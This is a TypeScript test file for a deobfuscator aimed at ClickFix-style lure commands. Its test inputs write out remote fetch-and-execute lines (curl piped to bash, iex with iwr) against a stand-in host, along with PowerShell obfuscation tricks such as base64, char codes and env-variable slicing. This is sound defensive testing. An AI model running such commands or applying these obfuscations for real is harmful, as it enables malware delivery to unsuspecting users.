import { test } from 'node:test';
import assert from 'node:assert/strict';
import { deobfuscate } from '../src/deobfuscate.ts';
import { LURE_HOST, STAGE, backtick, caret, charCodes, encodePs, encodeUtf8, toHex } from './helpers.ts';

const reveals = (input: string, needle: RegExp) => {
  const d = deobfuscate(input);
  assert.match(d.layers.join('\n'), needle, `layers were:\n${d.layers.join('\n---\n')}`);
  return d;
};

test('decodes -EncodedCommand (UTF-16LE base64) and its short prefixes', () => {
  for (const flag of ['-EncodedCommand', '-enc', '-e', '-ec', '/enc']) {
    const d = reveals(`powershell ${flag} ${encodePs(STAGE)}`, new RegExp(LURE_HOST));
    assert.ok(d.tricks.has('base64'), flag);
  }
});

test('decodes FromBase64String in either encoding', () => {
  reveals(`iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${encodeUtf8(STAGE)}')))`, new RegExp(LURE_HOST));
  reveals(`iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('${encodePs(STAGE)}')))`, new RegExp(LURE_HOST));
});

test('decodes nested layers', () => {
  const inner = `powershell -enc ${encodePs(STAGE)}`;
  const d = reveals(`powershell -enc ${encodePs(inner)}`, new RegExp(LURE_HOST));
  assert.ok(d.layers.length >= 3);
});

test('decodes shell base64 piped to base64 -d', () => {
  reveals(`echo ${encodeUtf8(`curl -s https://${LURE_HOST}/x | bash`)} | base64 -d | bash`, new RegExp(LURE_HOST));
});

test('removes caret and backtick escapes', () => {
  const d1 = reveals(caret('powershell -c start calc'), /powershell -c start calc/);
  assert.ok(d1.tricks.has('caret-escapes'));
  const d2 = reveals(backtick('Invoke-Expression'), /invoke-expression/i);
  assert.ok(d2.tricks.has('backtick-escapes'));
});

test('folds split strings, format operator and replace', () => {
  reveals(`& ('Inv'+'oke-Ex'+'pression') 'x'`, /'Invoke-Expression'/);
  reveals(`& ("{1}{0}" -f 'ession','Invoke-Expr') 'x'`, /Invoke-Expression/);
  reveals(`& ('IXnvXokeX-ExpXression'.replace('X',''))`, /Invoke-Expression/);
  reveals(`& ('IZnvoke-Expression' -replace 'Z','')`, /Invoke-Expression/);
});

test('decodes [char] codes', () => {
  const d = reveals(`& (${charCodes('iex')}) 'x'`, /'iex'/);
  assert.ok(d.tricks.has('char-codes'));
  reveals(`&([char[]](105,101,120) -join '')`, /'iex'/);
});

test('resolves environment-variable slicing', () => {
  // %COMSPEC% is C:\WINDOWS\system32\cmd.exe; characters 4,15,25 spell "iex" in lower case.
  const d = reveals(`&($env:comspec[4,15,25]-join'')`, /'Iex'|'iex'/i);
  assert.ok(d.tricks.has('env-slicing'));
  reveals(`%COMSPEC:~-7,3% /c echo SIMULATED-CLICKFIX`, /cmd \/c/);
});

test('inlines variables', () => {
  reveals(`$u='https://${LURE_HOST}/a.ps1'; $c='iex'; & $c (iwr $u)`, /iwr https:\/\/example-lure\.test/);
  reveals(`set a=power&& set b=shell&& %a%%b% -c echo SIMULATED-CLICKFIX`, /powershell -c/);
});

test('splits decoy comments and notes padding', () => {
  const d = deobfuscate(`${STAGE}${' '.repeat(60)}# I am not a robot - reCAPTCHA Verification ID: 2165`);
  assert.ok(d.tricks.has('padding'));
  assert.equal(d.comments.length, 1);
  assert.match(d.comments[0], /not a robot/);
  assert.doesNotMatch(d.layers[0], /robot/);
});

test('does not treat a URL fragment as a comment', () => {
  const d = deobfuscate('curl https://docs.example.dev/#/install');
  assert.equal(d.comments.length, 0);
});

test('decodes hex and url-encoding', () => {
  reveals(`echo ${toHex(STAGE)} | xxd -r -p | sh`, new RegExp(LURE_HOST));
  reveals([...STAGE].map((c) => `%${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join(''), new RegExp(LURE_HOST));
});

test('strips zero-width characters', () => {
  const d = reveals('pow\u200Bersh\u200Dell -c echo SIMULATED-CLICKFIX', /powershell/);
  assert.ok(d.tricks.has('invisible-chars'));
});

test('ignores hashes and short base64-looking words', () => {
  const d = deobfuscate('git checkout 3f786850e387550fdab836ed7e6dc881de23001b && npm ci');
  assert.equal(d.layers.length, 1);
  assert.equal(d.tricks.size, 0);
});
